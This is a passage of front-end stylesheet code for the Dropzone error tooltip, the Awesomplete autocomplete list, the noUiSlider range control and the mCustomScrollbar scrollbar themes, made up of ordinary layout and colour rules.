            position: absolute;
            display: block;
            display: none;
            opacity: 0;
            -webkit-transition: opacity .3s ease;
            transition: opacity .3s ease;
            border-radius: 8px;
            font-size: 13px;
            top: 130px;
            left: -10px;
            width: 140px;
            background: #be2626;
            background: -webkit-gradient(linear, left top, left bottom, from(#be2626), to(#a92222));
            background: linear-gradient(180deg, #be2626, #a92222);
            padding: .5em 1.2em;
            color: #fff
        }

        .dropzone .dz-preview .dz-error-message:after {
            content: "";
            position: absolute;
            top: -6px;
            left: 64px;
            width: 0;
            height: 0;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-bottom: 6px solid #be2626
        }

        .awesomplete [hidden] {
            display: none
        }

        .awesomplete .visually-hidden {
            position: absolute;
            clip: rect(0, 0, 0, 0)
        }

        .awesomplete {
            display: inline-block;
            position: relative
        }

        .awesomplete>input {
            display: block
        }

        .awesomplete>ul {
            position: absolute;
            left: 0;
            z-index: 1;
            min-width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            list-style: none;
            padding: 0;
            margin: 0;
            background: #fff
        }

        .awesomplete>ul:empty {
            display: none
        }

        .awesomplete>ul {
            border-radius: .3em;
            margin: .2em 0 0;
            background: hsla(0, 0%, 100%, .9);
            background: -webkit-gradient(linear, left top, right bottom, from(#fff), to(hsla(0, 0%, 100%, .8)));
            background: linear-gradient(to bottom right, #fff, hsla(0, 0%, 100%, .8));
            border: 1px solid rgba(0, 0, 0, .3);
            -webkit-box-shadow: .05em .2em .6em rgba(0, 0, 0, .2);
            box-shadow: .05em .2em .6em rgba(0, 0, 0, .2);
            text-shadow: none
        }

        @supports ((-webkit-transform:scale(0)) or (transform:scale(0))) {
            .awesomplete>ul {
                -webkit-transition: .3s cubic-bezier(.4, .2, .5, 1.4);
                transition: .3s cubic-bezier(.4, .2, .5, 1.4);
                -webkit-transform-origin: 1.43em -.43em;
                transform-origin: 1.43em -.43em
            }

            .awesomplete>ul:empty,
            .awesomplete>ul[hidden] {
                opacity: 0;
                -webkit-transform: scale(0);
                transform: scale(0);
                display: block;
                -webkit-transition-timing-function: ease;
                transition-timing-function: ease
            }
        }

        .awesomplete>ul:before {
            content: "";
            position: absolute;
            top: -.43em;
            left: 1em;
            width: 0;
            height: 0;
            padding: .4em;
            background: #fff;
            border: inherit;
            border-right: 0;
            border-bottom: 0;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg)
        }

        .awesomplete>ul>li {
            position: relative;
            padding: .2em .5em;
            cursor: pointer
        }

        .awesomplete>ul>li:hover {
            background: #b8d3e0;
            color: #000
        }

        .awesomplete>ul>li[aria-selected=true] {
            background: #3d6d8f;
            color: #fff
        }

        .awesomplete mark {
            background: #eaff00
        }

        .awesomplete li:hover mark {
            background: #b5d100
        }

        .awesomplete li[aria-selected=true] mark {
            background: #3d6b00;
            color: inherit
        }

        /*! nouislider - 10.1.0 - 2017-07-28 17:11:18 */
        .noUi-target,
        .noUi-target * {
            -webkit-touch-callout: none;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            -webkit-user-select: none;
            -ms-touch-action: none;
            touch-action: none;
            -ms-user-select: none;
            -moz-user-select: none;
            user-select: none;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .noUi-target {
            position: relative;
            direction: ltr
        }

        .noUi-base {
            width: 100%;
            height: 100%;
            position: relative;
            z-index: 1
        }

        .noUi-connect {
            position: absolute;
            right: 0;
            top: 0;
            left: 0;
            bottom: 0
        }

        .noUi-origin {
            position: absolute;
            height: 0;
            width: 0
        }

        .noUi-handle {
            position: relative;
            z-index: 1
        }

        .noUi-state-tap .noUi-connect,
        .noUi-state-tap .noUi-origin {
            -webkit-transition: top .3s, right .3s, bottom .3s, left .3s;
            transition: top .3s, right .3s, bottom .3s, left .3s
        }

        .noUi-state-drag * {
            cursor: inherit !important
        }

        .noUi-base,
        .noUi-handle {
            -webkit-transform: translateZ(0);
            transform: translateZ(0)
        }

        .noUi-horizontal {
            height: 18px
        }

        .noUi-horizontal .noUi-handle {
            width: 34px;
            height: 28px;
            left: -17px;
            top: -6px
        }

        .noUi-vertical {
            width: 18px
        }

        .noUi-vertical .noUi-handle {
            width: 28px;
            height: 34px;
            left: -6px;
            top: -17px
        }

        .noUi-target {
            background: #fafafa;
            border-radius: 4px;
            border: 1px solid #d3d3d3;
            -webkit-box-shadow: inset 0 1px 1px #f0f0f0, 0 3px 6px -5px #bbb;
            box-shadow: inset 0 1px 1px #f0f0f0, 0 3px 6px -5px #bbb
        }

        .noUi-connect {
            background: #3fb8af;
            border-radius: 4px;
            -webkit-box-shadow: inset 0 0 3px rgba(51, 51, 51, .45);
            box-shadow: inset 0 0 3px rgba(51, 51, 51, .45);
            -webkit-transition: background .45s;
            transition: background .45s
        }

        .noUi-draggable {
            cursor: ew-resize
        }

        .noUi-vertical .noUi-draggable {
            cursor: ns-resize
        }

        .noUi-handle {
            border: 1px solid #d9d9d9;
            border-radius: 3px;
            background: #fff;
            cursor: default;
            -webkit-box-shadow: inset 0 0 1px #fff, inset 0 1px 7px #ebebeb, 0 3px 6px -3px #bbb;
            box-shadow: inset 0 0 1px #fff, inset 0 1px 7px #ebebeb, 0 3px 6px -3px #bbb
        }

        .noUi-active {
            -webkit-box-shadow: inset 0 0 1px #fff, inset 0 1px 7px #ddd, 0 3px 6px -3px #bbb;
            box-shadow: inset 0 0 1px #fff, inset 0 1px 7px #ddd, 0 3px 6px -3px #bbb
        }

        .noUi-handle:after,
        .noUi-handle:before {
            content: "";
            display: block;
            position: absolute;
            height: 14px;
            width: 1px;
            background: #e8e7e6;
            left: 14px;
            top: 6px
        }

        .noUi-handle:after {
            left: 17px
        }

        .noUi-vertical .noUi-handle:after,
        .noUi-vertical .noUi-handle:before {
            width: 14px;
            height: 1px;
            left: 6px;
            top: 14px
        }

        .noUi-vertical .noUi-handle:after {
            top: 17px
        }

        [disabled] .noUi-connect {
            background: #b8b8b8
        }

        [disabled].noUi-handle,
        [disabled] .noUi-handle,
        [disabled].noUi-target {
            cursor: not-allowed
        }

        .noUi-pips,
        .noUi-pips * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .noUi-pips {
            position: absolute;
            color: #999
        }

        .noUi-value {
            position: absolute;
            white-space: nowrap;
            text-align: center
        }

        .noUi-value-sub {
            color: #ccc;
            font-size: 10px
        }

        .noUi-marker {
            position: absolute;
            background: #ccc
        }

        .noUi-marker-large,
        .noUi-marker-sub {
            background: #aaa
        }

        .noUi-pips-horizontal {
            padding: 10px 0;
            height: 80px;
            top: 100%;
            left: 0;
            width: 100%
        }

        .noUi-value-horizontal {
            -webkit-transform: translate3d(-50%, 50%, 0);
            transform: translate3d(-50%, 50%, 0)
        }

        .noUi-marker-horizontal.noUi-marker {
            margin-left: -1px;
            width: 2px;
            height: 5px
        }

        .noUi-marker-horizontal.noUi-marker-sub {
            height: 10px
        }

        .noUi-marker-horizontal.noUi-marker-large {
            height: 15px
        }

        .noUi-pips-vertical {
            padding: 0 10px;
            height: 100%;
            top: 0;
            left: 100%
        }

        .noUi-value-vertical {
            -webkit-transform: translate3d(0, 50%, 0);
            transform: translate3d(0, 50%, 0);
            padding-left: 25px
        }

        .noUi-marker-vertical.noUi-marker {
            width: 5px;
            height: 2px;
            margin-top: -1px
        }

        .noUi-marker-vertical.noUi-marker-sub {
            width: 10px
        }

        .noUi-marker-vertical.noUi-marker-large {
            width: 15px
        }

        .noUi-tooltip {
            display: block;
            position: absolute;
            border: 1px solid #d9d9d9;
            border-radius: 3px;
            background: #fff;
            color: #000;
            padding: 5px;
            text-align: center;
            white-space: nowrap
        }

        .noUi-horizontal .noUi-tooltip {
            -webkit-transform: translate(-50%);
            transform: translate(-50%);
            left: 50%;
            bottom: 120%
        }

        .noUi-vertical .noUi-tooltip {
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%);
            top: 50%;
            right: 120%
        }

        .mCustomScrollbar {
            -ms-touch-action: pinch-zoom;
            touch-action: pinch-zoom
        }

        .mCustomScrollbar.mCS_no_scrollbar,
        .mCustomScrollbar.mCS_touch_action {
            -ms-touch-action: auto;
            touch-action: auto
        }

        .mCustomScrollBox {
            position: relative;
            overflow: hidden;
            height: 100%;
            max-width: 100%;
            outline: none;
            direction: ltr
        }

        .mCSB_container {
            overflow: hidden;
            width: auto;
            height: auto
        }

        .mCSB_inside>.mCSB_container {
            margin-right: 30px
        }

        .mCSB_container.mCS_no_scrollbar_y.mCS_y_hidden {
            margin-right: 0
        }

        .mCS-dir-rtl>.mCSB_inside>.mCSB_container {
            margin-right: 0;
            margin-left: 30px
        }

        .mCS-dir-rtl>.mCSB_inside>.mCSB_container.mCS_no_scrollbar_y.mCS_y_hidden {
            margin-left: 0
        }

        .mCSB_scrollTools {
            position: absolute;
            width: 16px;
            height: auto;
            left: auto;
            top: 0;
            right: 0;
            bottom: 0
        }

        .mCSB_outside+.mCSB_scrollTools {
            right: -26px
        }

        .mCS-dir-rtl>.mCSB_inside>.mCSB_scrollTools,
        .mCS-dir-rtl>.mCSB_outside+.mCSB_scrollTools {
            right: auto;
            left: 0
        }

        .mCS-dir-rtl>.mCSB_outside+.mCSB_scrollTools {
            left: -26px
        }

        .mCSB_scrollTools .mCSB_draggerContainer {
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            height: auto
        }

        .mCSB_scrollTools a+.mCSB_draggerContainer {
            margin: 20px 0
        }

        .mCSB_scrollTools .mCSB_draggerRail {
            width: 2px;
            height: 100%;
            margin: 0 auto;
            border-radius: 16px
        }

        .mCSB_scrollTools .mCSB_dragger {
            cursor: pointer;
            width: 100%;
            height: 30px;
            z-index: 1
        }

        .mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            position: relative;
            width: 4px;
            height: 100%;
            margin: 0 auto;
            border-radius: 16px;
            text-align: center
        }

        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar {
            width: 12px
        }

        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            width: 8px
        }

        .mCSB_scrollTools .mCSB_buttonDown,
        .mCSB_scrollTools .mCSB_buttonUp {
            display: block;
            position: absolute;
            height: 20px;
            width: 100%;
            overflow: hidden;
            margin: 0 auto;
            cursor: pointer
        }

        .mCSB_scrollTools .mCSB_buttonDown {
            bottom: 0
        }

        .mCSB_horizontal.mCSB_inside>.mCSB_container {
            margin-right: 0;
            margin-bottom: 30px
        }

        .mCSB_horizontal.mCSB_outside>.mCSB_container {
            min-height: 100%
        }

        .mCSB_horizontal>.mCSB_container.mCS_no_scrollbar_x.mCS_x_hidden {
            margin-bottom: 0
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal {
            width: auto;
            height: 16px;
            top: auto;
            right: 0;
            bottom: 0;
            left: 0
        }

        .mCustomScrollBox+.mCSB_scrollTools+.mCSB_scrollTools.mCSB_scrollTools_horizontal,
        .mCustomScrollBox+.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            bottom: -26px
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal a+.mCSB_draggerContainer {
            margin: 0 20px
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 2px;
            margin: 7px 0
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_dragger {
            width: 30px;
            height: 100%;
            left: 0
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            width: 100%;
            height: 4px;
            margin: 6px auto
        }

        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded .mCSB_dragger_bar,
        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_dragger .mCSB_dragger_bar {
            height: 12px;
            margin: 2px auto
        }

        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger.mCSB_dragger_onDrag_expanded+.mCSB_draggerRail,
        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerContainer:hover .mCSB_draggerRail {
            height: 8px;
            margin: 4px 0
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_buttonLeft,
        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_buttonRight {
            display: block;
            position: absolute;
            width: 20px;
            height: 100%;
            overflow: hidden;
            margin: 0 auto;
            cursor: pointer
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_buttonLeft {
            left: 0
        }

        .mCSB_scrollTools.mCSB_scrollTools_horizontal .mCSB_buttonRight {
            right: 0
        }

        .mCSB_container_wrapper {
            position: absolute;
            height: auto;
            width: auto;
            overflow: hidden;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin-right: 30px;
            margin-bottom: 30px
        }

        .mCSB_container_wrapper>.mCSB_container {
            padding-right: 30px;
            padding-bottom: 30px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .mCSB_vertical_horizontal>.mCSB_scrollTools.mCSB_scrollTools_vertical {
            bottom: 20px
        }

        .mCSB_vertical_horizontal>.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            right: 20px
        }

        .mCSB_container_wrapper.mCS_no_scrollbar_x.mCS_x_hidden+.mCSB_scrollTools.mCSB_scrollTools_vertical {
            bottom: 0
        }

        .mCS-dir-rtl>.mCustomScrollBox.mCSB_vertical_horizontal.mCSB_inside>.mCSB_scrollTools.mCSB_scrollTools_horizontal,
        .mCSB_container_wrapper.mCS_no_scrollbar_y.mCS_y_hidden+.mCSB_scrollTools~.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            right: 0
        }

        .mCS-dir-rtl>.mCustomScrollBox.mCSB_vertical_horizontal.mCSB_inside>.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            left: 20px
        }

        .mCS-dir-rtl>.mCustomScrollBox.mCSB_vertical_horizontal.mCSB_inside>.mCSB_container_wrapper.mCS_no_scrollbar_y.mCS_y_hidden+.mCSB_scrollTools~.mCSB_scrollTools.mCSB_scrollTools_horizontal {
            left: 0
        }

        .mCS-dir-rtl>.mCSB_inside>.mCSB_container_wrapper {
            margin-right: 0;
            margin-left: 30px
        }

        .mCSB_container_wrapper.mCS_no_scrollbar_y.mCS_y_hidden>.mCSB_container {
            padding-right: 0
        }

        .mCSB_container_wrapper.mCS_no_scrollbar_x.mCS_x_hidden>.mCSB_container {
            padding-bottom: 0
        }

        .mCustomScrollBox.mCSB_vertical_horizontal.mCSB_inside>.mCSB_container_wrapper.mCS_no_scrollbar_y.mCS_y_hidden {
            margin-right: 0;
            margin-left: 0
        }

        .mCustomScrollBox.mCSB_vertical_horizontal.mCSB_inside>.mCSB_container_wrapper.mCS_no_scrollbar_x.mCS_x_hidden {
            margin-bottom: 0
        }

        .mCSB_scrollTools,
        .mCSB_scrollTools .mCSB_buttonDown,
        .mCSB_scrollTools .mCSB_buttonLeft,
        .mCSB_scrollTools .mCSB_buttonRight,
        .mCSB_scrollTools .mCSB_buttonUp,
        .mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            -webkit-transition: opacity .2s ease-in-out, background-color .2s ease-in-out;
            transition: opacity .2s ease-in-out, background-color .2s ease-in-out
        }

        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_dragger_bar,
        .mCSB_scrollTools_horizontal.mCSB_scrollTools_onDrag_expand .mCSB_draggerRail,
        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_dragger_bar,
        .mCSB_scrollTools_vertical.mCSB_scrollTools_onDrag_expand .mCSB_draggerRail {
            -webkit-transition: width .2s ease-out .2s, height .2s ease-out .2s, margin-left .2s ease-out .2s, margin-right .2s ease-out .2s, margin-top .2s ease-out .2s, margin-bottom .2s ease-out .2s, opacity .2s ease-in-out, background-color .2s ease-in-out;
            transition: width .2s ease-out .2s, height .2s ease-out .2s, margin-left .2s ease-out .2s, margin-right .2s ease-out .2s, margin-top .2s ease-out .2s, margin-bottom .2s ease-out .2s, opacity .2s ease-in-out, background-color .2s ease-in-out
        }

        .mCSB_scrollTools {
            opacity: .75;
            filter: "alpha(opacity=75)";
            -ms-filter: "alpha(opacity=75)"
        }

        .mCS-autoHide>.mCustomScrollBox>.mCSB_scrollTools,
        .mCS-autoHide>.mCustomScrollBox~.mCSB_scrollTools {
            opacity: 0;
            filter: "alpha(opacity=0)";
            -ms-filter: "alpha(opacity=0)"
        }

        .mCS-autoHide:hover>.mCustomScrollBox>.mCSB_scrollTools,
        .mCS-autoHide:hover>.mCustomScrollBox~.mCSB_scrollTools,
        .mCustomScrollbar>.mCustomScrollBox>.mCSB_scrollTools.mCSB_scrollTools_onDrag,
        .mCustomScrollbar>.mCustomScrollBox~.mCSB_scrollTools.mCSB_scrollTools_onDrag,
        .mCustomScrollBox:hover>.mCSB_scrollTools,
        .mCustomScrollBox:hover~.mCSB_scrollTools {
            opacity: 1;
            filter: "alpha(opacity=100)";
            -ms-filter: "alpha(opacity=100)"
        }

        .mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .4);
            filter: "alpha(opacity=40)";
            -ms-filter: "alpha(opacity=40)"
        }

        .mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .75);
            filter: "alpha(opacity=75)";
            -ms-filter: "alpha(opacity=75)"
        }

        .mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .85);
            filter: "alpha(opacity=85)";
            -ms-filter: "alpha(opacity=85)"
        }

        .mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .9);
            filter: "alpha(opacity=90)";
            -ms-filter: "alpha(opacity=90)"
        }

        .mCSB_scrollTools .mCSB_buttonDown,
        .mCSB_scrollTools .mCSB_buttonLeft,
        .mCSB_scrollTools .mCSB_buttonRight,
        .mCSB_scrollTools .mCSB_buttonUp {
            background-image: url(assets/img/mCSB_buttons.png);
            background-repeat: no-repeat;
            opacity: .4;
            filter: "alpha(opacity=40)";
            -ms-filter: "alpha(opacity=40)"
        }

        .mCSB_scrollTools .mCSB_buttonUp {
            background-position: 0 0
        }

        .mCSB_scrollTools .mCSB_buttonDown {
            background-position: 0 -20px
        }

        .mCSB_scrollTools .mCSB_buttonLeft {
            background-position: 0 -40px
        }

        .mCSB_scrollTools .mCSB_buttonRight {
            background-position: 0 -56px
        }

        .mCSB_scrollTools .mCSB_buttonDown:hover,
        .mCSB_scrollTools .mCSB_buttonLeft:hover,
        .mCSB_scrollTools .mCSB_buttonRight:hover,
        .mCSB_scrollTools .mCSB_buttonUp:hover {
            opacity: .75;
            filter: "alpha(opacity=75)";
            -ms-filter: "alpha(opacity=75)"
        }

        .mCSB_scrollTools .mCSB_buttonDown:active,
        .mCSB_scrollTools .mCSB_buttonLeft:active,
        .mCSB_scrollTools .mCSB_buttonRight:active,
        .mCSB_scrollTools .mCSB_buttonUp:active {
            opacity: .9;
            filter: "alpha(opacity=90)";
            -ms-filter: "alpha(opacity=90)"
        }

        .mCS-dark.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .15)
        }

        .mCS-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-dark.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-dark.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-dark.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-dark.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -80px 0
        }

        .mCS-dark.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -80px -20px
        }

        .mCS-dark.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -80px -40px
        }

        .mCS-dark.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -80px -56px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-light-2.mCSB_scrollTools .mCSB_draggerRail {
            width: 4px;
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .1);
            border-radius: 1px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-2.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 4px;
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .75);
            border-radius: 1px
        }

        .mCS-dark-2.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-dark-2.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-light-2.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-2.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 4px;
            margin: 6px auto
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .85)
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-light-2.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .9)
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -32px 0
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -32px -20px
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -40px -40px
        }

        .mCS-light-2.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -40px -56px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .1);
            border-radius: 1px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75);
            border-radius: 1px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-dark-2.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -112px 0
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -112px -20px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -120px -40px
        }

        .mCS-dark-2.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -120px -56px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_draggerRail,
        .mCS-light-thick.mCSB_scrollTools .mCSB_draggerRail {
            width: 4px;
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .1);
            border-radius: 2px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 6px;
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .75);
            border-radius: 2px
        }

        .mCS-dark-thick.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-light-thick.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%;
            height: 4px;
            margin: 6px 0
        }

        .mCS-dark-thick.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-thick.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            width: 100%;
            height: 6px;
            margin: 5px auto
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .85)
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-light-thick.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .9)
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -16px 0
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -16px -20px
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -20px -40px
        }

        .mCS-light-thick.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -20px -56px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .1);
            border-radius: 2px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75);
            border-radius: 2px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-dark-thick.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -96px 0
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -96px -20px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -100px -40px
        }

        .mCS-dark-thick.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -100px -56px
        }

        .mCS-light-thin.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .1)
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-thin.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 2px
        }

        .mCS-dark-thin.mCSB_scrollTools_horizontal .mCSB_draggerRail,
        .mCS-light-thin.mCSB_scrollTools_horizontal .mCSB_draggerRail {
            width: 100%
        }

        .mCS-dark-thin.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar,
        .mCS-light-thin.mCSB_scrollTools_horizontal .mCSB_dragger .mCSB_dragger_bar {
            width: 100%;
            height: 2px;
            margin: 7px auto
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #000;
            background-color: rgba(0, 0, 0, .15)
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .75)
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_dragger:hover .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .85)
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_dragger.mCSB_dragger_onDrag .mCSB_dragger_bar,
        .mCS-dark-thin.mCSB_scrollTools .mCSB_dragger:active .mCSB_dragger_bar {
            background-color: #000;
            background-color: rgba(0, 0, 0, .9)
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_buttonUp {
            background-position: -80px 0
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_buttonDown {
            background-position: -80px -20px
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_buttonLeft {
            background-position: -80px -40px
        }

        .mCS-dark-thin.mCSB_scrollTools .mCSB_buttonRight {
            background-position: -80px -56px
        }

        .mCS-rounded.mCSB_scrollTools .mCSB_draggerRail {
            background-color: #fff;
            background-color: hsla(0, 0%, 100%, .15)
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger,
        .mCS-rounded-dots.mCSB_scrollTools .mCSB_dragger,
        .mCS-rounded.mCSB_scrollTools .mCSB_dragger {
            height: 14px
        }

        .mCS-rounded-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded-dots-dark.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded-dots.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar,
        .mCS-rounded.mCSB_scrollTools .mCSB_dragger .mCSB_dragger_bar {
            width: 14px;
            margin: 0 1px
        }

        .mCS-rounded-dark.mCSB_scrollTools_horizontal .mCSB_dragger,
        .mCS-rounded-dots-dark.mCSB_scrollTools_horizontal .mCSB_dragger,
        .mCS-rounded-dots.mCSB_scrollTools_horizontal .mCSB_dragger,
